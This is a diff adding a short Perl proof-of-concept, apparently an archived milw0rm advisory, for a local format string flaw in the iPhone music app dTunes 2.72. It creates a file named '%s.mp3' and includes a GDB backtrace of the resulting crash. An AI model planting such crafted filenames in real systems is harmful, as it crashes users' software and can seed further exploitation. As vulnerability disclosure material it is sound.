@@ -1,0 +1,55 @@
+#!/usr/bin/perl
+
+# dTunes 2.72 local format string PoC (filename processing)
+# TheLeader, GSOG2009 [st0p] hotmail [sp4m] com
+# ShoutZ to the wonderful ppl over at forums.hacking.org.il =]
+
+# Copy the file over to your device on /var/mobile/Library/Downloads/ and attempt playing with dTunes.
+# This can also be done through dTunes interface - just tap "Edit", double tap any mp3 file, rename to "%s.mp3", tap "Save", confirm & play.
+
+# PoC:
+open (FILE, '>%s.mp3');
+close (FILE);
+
+# GDB backtrace:
+# 0x3146baa4 in mach_msg_trap ()
+# (gdb) c
+# Continuing.
+#
+# Program received signal SIGABRT, Aborted.
+# 0x3145dc58 in __kill ()
+# (gdb) bt
+# #0  0x3145dc58 in __kill ()
+# #1  0x3145dc4c in kill ()
+# #2  0x3145dc40 in raise ()
+# #3  0x3147842a in abort ()
+# #4  0x30075b44 in __gnu_cxx::__verbose_terminate_handler ()
+# #5  0x300c2100 in _objc_terminate ()
+# #6  0x300730d8 in std::terminate ()
+# #7  0x300731e0 in __cxa_throw ()
+# #8  0x300c1f8c in objc_exception_throw ()
+# #9  0x3029a59e in +[NSException raise:format:arguments:] ()
+# #10 0x3029a53e in +[NSException raise:format:] ()
+# #11 0x30696de4 in -[NSURL initWithString:relativeToURL:] ()
+# #12 0x30696cde in +[NSURL URLWithString:relativeToURL:] ()
+# #13 0x330c1008 in -[AVPlaybackItem urlFromPath:] ()
+# #14 0x330c259c in -[AVPlaybackItem ensureFPItem] ()
+# #15 0x330c4304 in -[AVPlaybackQueue queueItemWasAddedNotification:] ()
+# #16 0x30672726 in _nsnote_callback ()
+# #17 0x302615a8 in _CFXNotificationPostNotification ()
+# #18 0x30670e72 in -[NSNotificationCenter postNotificationName:object:userInfo:] ()
+# #19 0x330aa750 in -[AVQueue itemWasAdded:atIndex:] ()
+# #20 0x330aa89c in -[AVQueue insertItem:atIndex:error:] ()
+# #21 0x000037e4 in -[DTunesMusicPlayViewController buildTrack:] ()
+# #22 0x0000366a in -[DTunesMusicPlayViewController nextTrack] ()
+# #23 0x000032a0 in -[DTunesMusicPlayViewController updateScreenWhilePlaying] ()
+# #24 0x306942a6 in __NSFireTimer ()
+# #25 0x30269d8e in CFRunLoopRunSpecific ()
+# #26 0x30269326 in CFRunLoopRunInMode ()
+# #27 0x31567e60 in GSEventRunModal ()
+# #28 0x30a4fa74 in -[UIApplication _run] ()
+# #29 0x30a591d8 in UIApplicationMain ()
+# #30 0x00002096 in main ()
+# (gdb) q
+
+# milw0rm.com [2009-09-01]
